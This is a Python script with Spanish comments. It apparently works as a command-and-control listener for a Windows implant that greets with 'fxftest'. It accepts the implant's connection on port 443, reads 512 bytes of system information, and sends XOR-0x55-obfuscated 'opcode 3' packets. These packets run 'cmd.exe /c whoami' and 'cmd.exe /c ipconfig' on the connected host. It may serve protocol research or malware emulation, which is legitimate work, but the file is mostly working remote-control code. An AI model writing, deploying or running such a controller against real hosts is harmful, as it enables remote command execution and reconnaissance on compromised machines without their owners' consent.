#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, struct, binascii

HOST = ''          # 0.0.0.0
PORT = 443
TIMEOUT_S = 60
RECV_SZ = 65535

def hexdump(b: bytes) -> str:
    hx = binascii.hexlify(b).decode('ascii')
    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))

def xor55(b: bytes) -> bytes:
    return bytes((x ^ 0x55) for x in b)

def pad_256_nul(b: bytes) -> bytes:
    """Devuelve exactamente 256 bytes, NUL‑terminado y relleno con 0x00."""
    b = (b + b'\x00')
    if len(b) < 256:
        b = b + (b'\x00' * (256 - len(b)))
    else:
        b = b[:256]
        if b[-1] != 0:
            b = b[:-1] + b'\x00'
    return b

def read_exact(sock: socket.socket, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf

def send_opcode3(sock: socket.socket, cmd_clear: str):
    """Construye y envía un paquete 0x104 con opcode 3 y el comando indicado."""
    param = pad_256_nul(cmd_clear.encode('ascii'))
    param_x = xor55(param)
    pkt = struct.pack('<I', 3) + param_x + b'\x00' * (0x104 - 4 - 256)
    sock.sendall(pkt)
    print(f"[TX opcode3=3 260 B] comando='{cmd_clear}'")
    return pkt

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Escuchando en 0.0.0.0:{PORT}")

    while True:
        conn, addr = s.accept()
        conn.settimeout(TIMEOUT_S)
        print(f"[+] Conexión de {addr[0]}:{addr[1]}")

        try:
            # 1) HELLO (buscamos 'fxftest' en lo primero que llegue)
            hello = conn.recv(32)
            print(f"[RX {len(hello)} B] ASCII={hello!r}")
            print(f"HEX = {hexdump(hello)}")
            if b'fxftest' not in hello:
                print("[!] No llegó el saludo esperado, cerrando.")
                conn.close()
                continue

            # 2) Handshake
            hs = b'fxftest\x00'
            conn.sendall(hs)
            print(f"[TX handshake {len(hs)} B]")

            # 3) SYSINFO (512)
            sysinfo = read_exact(conn, 512)
            print(f"[RX 512 B] ASCII={repr(sysinfo[:64])} ...")
            print(f"HEX = {hexdump(sysinfo[:64])} ...")

            # 4) opcode 3 -> whoami
            send_opcode3(conn, "cmd.exe /c whoami")

            # 5) leer STATUS (2 bytes)
            st = read_exact(conn, 2)
            print(f"[RX 2 B] ASCII={st!r}")
            print(f"HEX = {hexdump(st)}")

            # --- lo que pediste: enviar ipconfig inmediatamente después ---
            cmd2 = r"cmd.exe /c ipconfig".encode("ascii") + b"\x00"
            cmd2 = (cmd2 + b"\x00" * 256)[:256]          # ajustar a 256 con NUL
            cmd2_x = bytes([b ^ 0x55 for b in cmd2])     # XOR 0x55
            pkt_next = struct.pack("<I", 3) + cmd2_x + b"\x00" * (0x104 - 4 - 256)
            conn.sendall(pkt_next)
            print("[TX opcode3 bis] ipconfig enviado")

            # 6) leer STATUS del segundo opcode3
            st2 = read_exact(conn, 2)
            print(f"[STATUS opcode3 2B] {st2!r}  HEX={hexdump(st2)}")

        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            conn.close()
            print("[*] Conexión cerrada.\n")

if __name__ == "__main__":
    main()
